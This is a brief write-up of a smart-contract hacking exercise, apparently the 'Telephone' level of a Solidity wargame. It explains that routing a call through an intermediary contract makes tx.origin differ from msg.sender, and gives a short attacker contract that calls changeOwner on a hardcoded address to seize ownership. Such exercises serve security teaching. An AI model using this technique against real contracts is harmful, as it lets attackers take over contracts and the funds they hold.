tx.origin can only hold an address of a user wallet and not a smart contract,by writing a 
contract to interact with telephone I was able to make sure tx.origin != msg.sender.

contract hackTelephone{
Telephone public phone = Telephone(0x189488Ca923c089F0babf3b3a33dC376a27950f6);
constructor(address _owner)public{
    phone.changeOwner(_owner);
}
}
